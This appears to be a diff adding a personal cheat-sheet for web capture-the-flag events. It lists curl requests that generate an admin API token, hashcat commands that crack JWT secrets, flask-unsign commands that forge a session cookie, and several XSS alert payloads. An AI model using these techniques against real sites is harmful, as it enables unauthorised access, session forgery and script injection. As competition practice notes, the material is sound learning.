@@ -1,0 +1,50 @@
+UAP CTF:
+
+curl -I https://abc.xyz/getflag
+curl -X POST https://abc.xyz/getflag
+
+curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1" https://example.com
+curl -A "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36" https://example.com
+
+curl -X POST http://uapctf.local:3337/api/generate/token -H "Content-Type: application/json" -d '{"username": "admin"}'
+curl -X GET http://uapctf.local:3337/api/users/all -H "X-Api-Token: 405aaa8f-9fc9-492e-914e-9222d7e8c5a6" | jq
+
+Jwt Online : https://jwt.io/
+	     https://token.dev/
+
+JWT Decryptor:
+nano hash.txt
+hashcat --identify hash.txt
+hashcat -m 16500 hash.txt jwt.secrets.list
+
+nano hash.txt
+hashcat --identify hash.txt
+hashcat -m 16500 hash.txt jwt.secrets.list
+flask-unsign --sign --cookie "{'user_id': '1'}" --secret 'Ei-perro-de-boca-se-llama-hugo'
+
+pip install flask-unsign
+flask-unsign --decode --cookie "<cookie_value>"
+flask-unsign --decode --cookie "<cookie_value>" --secret "<secret_key>"
+flask-unsign --unsign --cookie "<cookie_value>" --wordlist <wordlist.txt>
+
+-> You can change useragent via curl or via inspect or any extention
+-> Must be always see Cookie Editor
+
+NCD 2021:
+JS: https://beautifier.io/
+de4js: https://lelinhtinh.github.io/de4js/
+
+IUCD 2021:
+<script>alert('A quick brown fox jumps over the lazy dog')</script>
+<script>alert('CYBERDRILL2021')</script>
+<img src=x onerror=eval("alert('DRILL2021')")>
+<img src=x onerror=alert('DRILL2021')>
+<img src=x oneror=prompt=>alert('DRILL2021')>
+
+-> You can input anything in box field and you can add xss in burpsuite
+
+
+
+
+
+
